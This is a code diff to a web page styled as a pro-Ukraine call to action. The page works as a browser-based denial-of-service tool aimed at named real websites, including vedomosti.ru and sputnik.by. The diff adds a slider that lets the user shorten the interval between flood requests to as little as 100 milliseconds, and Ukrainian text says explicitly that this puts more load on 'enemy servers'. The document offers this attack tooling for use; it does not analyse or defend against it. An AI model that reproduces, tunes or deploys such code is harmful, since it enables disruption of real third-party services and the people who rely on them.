@@ -26,6 +26,34 @@
 			width: 30%;
 			padding: 5px 10px;
 		}
+		.wraper {
+			position: fixed;
+			left: 0;
+			bottom: 0;
+			background-color: rgba(174, 219, 253, 0.83);
+			padding: 20px 30px;
+			width: 100%;
+		}
+		.wraper input {
+			display: block;
+			margin: 0 auto;
+			width: 90%;
+			cursor: pointer;
+		}
+		.text-wraper {
+			font-family: sans-serif;
+			font-size: 18px;
+			color: rgb(55, 54, 54);
+		}
+		.value-text {
+			font-size: 20px;
+			text-transform: uppercase;
+			font-weight: 400;
+		}
+		#inner-value {
+			font-size: 22px;
+			font-weight: bold;
+		}
 	</style>
 	<body>
 		<h1>Russia MUST BE STOPPED! Help Ukraine WIN!</h1>
@@ -54,6 +82,16 @@
 				</td>
 			</tr>
 		</table>
+		<div class="wraper">
+			<div class="text-wraper">
+				<p>
+					міняючи значення повзунка ти можеш міняти частоту запитів на сервер за одну секунду, чим менше значення повзунка тим менший інтервал часу між запитиами і таким чином ти створюєш більше
+					навантаження на ворожі сервери, за умовчуванням запити відправляються кожні 500 мілісекунд
+				</p>
+				<p class="value-text">Інтервал між запитами <span id="inner-value"></span> мілісекунд</p>
+			</div>
+			<input type="range" min="100" max="1000" step="10" value="500" id="range" />
+		</div>
 		<div>
 			<table>
 				<tr>
@@ -66,6 +104,9 @@
 		</div>
 		<script>
 			let stats = document.querySelector("#stats");
+			let range = document.querySelector("#range");
+			let innerRangeValue = document.querySelector("#inner-value");
+			let rangeValue = range.value;
 			let statsData = [];
 			let table = "";
 			let targets = [
@@ -136,6 +177,12 @@
 				"https://www.vedomosti.ru/",
 				"https://sputnik.by/",
 			];
+			innerRangeValue.innerText = rangeValue;
+			range.addEventListener("change", function (e) {
+				sendQuery(targets);
+				rangeValue = +this.value;
+				innerRangeValue.innerText = rangeValue;
+			});
 			targets.forEach(function (k) {
 				statsData.push({ host: k, err: false, queryNum: 0, errorNum: 0 });
 			});
@@ -161,7 +208,8 @@
 							});
 					});
 					drawStats(statsData);
-				}, 500);
+					console.warn(rangeValue);
+				}, rangeValue);
 			}
 			function drawStats(a) {
 				// показ статистики відправки запитів на хости
